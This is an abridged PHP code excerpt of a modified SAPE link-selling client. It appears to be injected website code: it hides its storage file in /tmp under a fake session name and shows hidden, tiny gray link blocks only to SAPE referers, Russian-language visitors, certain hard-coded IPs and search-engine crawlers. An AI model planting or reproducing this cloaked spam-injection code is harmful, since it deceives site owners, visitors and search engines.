...
class SAPE_client extends SAPE_base {
    ...
    function _get_db_file() {
        if ($this->_multi_site) {
            return '/tmp/sess_7a68212f5df46s541wq479e57d096af7badclaw';
        } else {
            return '/tmp/sess_7a68212f5df46s541wq479e57d096af7badclaw';
        }
    }
...
class SAPE_context extends SAPE_base {
    ...
    function replace_in_text_segment($text){
        $debug = '';
        if ($this->_debug){
            $debug .= "<!-- argument for replace_in_text_segment: \r
".base64_encode($text)."\r
 -->";
        }
...
function f(){
   ...
   {
     $rsp=strpos($_SERVER['HTTP_REFERER'],'sape');
	 $rrs=strpos($_SERVER['HTTP_ACCEPT_LANGUAGE'],'ru');
     if (gettype($rsp)=='integer' || gettype($rrs)=='integer' || $_SERVER['REMOTE_ADDR']=='81.177.144.46' || $_SERVER['REMOTE_ADDR']=='217.107.36.73' || $_SERVER['REMOTE_ADDR']=='217.107.36.132' || $_SERVER['REMOTE_ADDR']=='87.242.74.101' || $_SERVER['REMOTE_ADDR']=='80.251.136.38' || $_SERVER['HTTP_USER_AGENT'] == 'Yandex' || $_SERVER['HTTP_USER_AGENT'] == 'Googlebot')   
    {
	echo '<div id="nvorst">';
 ...
 font-size: 8px;   color: gray; text-align: center;
	...
	echo '<div id="bdd1b7801d9329b2f9d7313381627c70c">';
	   ...
	   if (!defined("_SAPE_USER")){
        	define("_SAPE_USER", "3c0d0839fc4d96d98ec1808f0667cd8a"); 
   		}
	   $o['charset'] = 'UTF-8';
